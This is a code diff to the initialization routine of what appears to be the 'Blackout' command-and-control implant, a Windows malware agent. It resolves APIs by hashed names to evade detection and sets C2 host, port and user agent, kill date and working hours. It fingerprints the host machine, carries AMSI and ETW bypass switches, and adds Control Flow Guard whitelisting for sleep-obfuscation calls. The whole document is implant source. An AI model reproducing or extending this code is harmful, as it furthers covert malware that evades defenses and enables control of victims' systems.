@@ -19,13 +19,7 @@ FUNC VOID BlackoutInit() {
     Instance()->Modules.Ntdll      = LdrModuleAddr( H_MODULE_NTDLL );
 
     Instance()->Win32.LoadLibraryA   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
-    Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
-    Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
-    Instance()->Modules.Msvcrt       = Instance()->Win32.LoadLibraryA( "Msvcrt.dll"   );
-    Instance()->Modules.Cryptbase    = Instance()->Win32.LoadLibraryA( "Cryptbase.dll" );
     Instance()->Win32.GetProcAddress = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );
-    Instance()->Win32.printf         = Instance()->Win32.GetProcAddress( Instance()->Modules.Msvcrt, "printf" );
-    Instance()->Modules.Iphlpapi     = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );
 
     Instance()->Win32.GetModuleHandleA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
     Instance()->Win32.CreateTimerQueueTimer     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
@@ -92,6 +86,12 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtWaitForSingleObject     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
     Instance()->Win32.NtSignalAndWaitForSingleObject = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
 
+    Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
+    Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
+    Instance()->Modules.Msvcrt       = Instance()->Win32.LoadLibraryA( "Msvcrt.dll"   );
+    Instance()->Modules.Cryptbase    = Instance()->Win32.LoadLibraryA( "Cryptbase.dll" );
+    Instance()->Modules.Iphlpapi     = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );
+
     Instance()->Win32.GetUserNameA     = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
     Instance()->Win32.OpenProcessToken = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
     Instance()->Win32.OpenThreadToken  = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenThreadToken" ) );
@@ -108,27 +108,25 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.SystemFunction040 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction040" ) );
     Instance()->Win32.SystemFunction041 = LdrFuncAddr( Instance()->Modules.Cryptbase, HASH_STR( "SystemFunction041" ) );
 
-    Instance()->Win32.printf = Instance()->Win32.GetProcAddress( Instance()->Modules.Msvcrt, "printf" );
-
     Instance()->Win32.GetAdaptersInfo = LdrFuncAddr( Instance()->Modules.Iphlpapi, HASH_STR( "GetAdaptersInfo" ) );
+
+    Instance()->Win32.printf = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
+
+
+    /*============================[ Agent config initialization ]============================*/
+
+    Instance()->Config.Session.WorkingHours = CONFIG_WRKHRS;
+    Instance()->Config.Session.KillDate     = CONFIG_KILLDATE;
+    Instance()->Config.Session.SleepTime    = CONFIG_SLEEP;
+    Instance()->Config.Session.Jitter       = 0x00;
     //Instance()->Config.Session.AgentId    = RandomNumber32();
     Instance()->Config.Session.AmsiBypass = FALSE;
     Instance()->Config.Session.EtwBypass  = FALSE;
     Instance()->Config.Session.Heap       = Instance()->Teb->ProcessEnvironmentBlock->ProcessHeap;
     Instance()->Config.Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
     Instance()->Config.Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
-        
-    MEMORY_BASIC_INFORMATION Mbi = { 0 };
-    Instance()->Win32.VirtualQuery( Instance()->Base.Buffer, &Mbi, sizeof( Mbi ) );
-
-    Instance()->Win32.printf( "[I] AllocationBase 0x%p\n[I] AllocationProtection %x\n[I] RegionSize %ld\n[I] Type %x\n[I] Base address 0x%p\n[I] Protection %x\n\n", 
-    Mbi.AllocationBase, Mbi.AllocationProtect, Mbi.RegionSize, Mbi.Type, Mbi.BaseAddress, Mbi.Protect );
-
-    GetProcessInfo( 
-        &Instance()->Config.Session.ProcessFullPath, 
-        &Instance()->Config.Session.ProcessName, 
-        &Instance()->Config.Session.ProcessCmdLine 
-    );
+    
+    /*============================[ Machine recognition ]============================*/
 
     GetComputerInfo( 
         &Instance()->Config.CompData.OsArch,
@@ -144,16 +142,33 @@ FUNC VOID BlackoutInit() {
     Instance()->Config.CompData.OsArch        = 0;
     Instance()->Config.CompData.ProcessorType = 0;
     
-    Instance()->Config.Session.SleepTime  = CONFIG_SLEEP;
-    Instance()->Config.Session.Jitter     = 0x00;
+
+    /*============================[ Http/s listener config ]============================*/
 
     Instance()->Config.TransportWeb.Host      = CONFIG_HOST;
     Instance()->Config.TransportWeb.Port      = CONFIG_PORT;
     Instance()->Config.TransportWeb.UserAgent = CONFIG_USERAGENT;
     Instance()->Config.TransportWeb.Secure    = CONFIG_SECURE;
 
-    Instance()->Config.Session.WorkingHours = CONFIG_WRKHRS;
-    Instance()->Config.Session.KillDate     = CONFIG_KILLDATE;
+    GetProcessInfo( 
+        &Instance()->Config.Session.ProcessFullPath, 
+        &Instance()->Config.Session.ProcessName, 
+        &Instance()->Config.Session.ProcessCmdLine 
+    );
+
+    /*============================[ CFG Routine to SleepObf ]============================*/
+
+    if ( CfgCheckEnabled() ) {
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtContinue );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtSetContextThread );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtGetContextThread );
+        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction040  );
+        CfgAddressAdd( Instance()->Modules.Cryptbase, Instance()->Win32.SystemFunction041  );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtTestAlert );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.NtWaitForSingleObject );
+        CfgAddressAdd( Instance()->Modules.Kernel32,  Instance()->Win32.VirtualProtect );
+        CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
+    }
 
     Instance()->Win32.printf( 
         "[INFO] Blackout agent initialized @ 0x%p [%d bytes] FullLen [%d]\n"
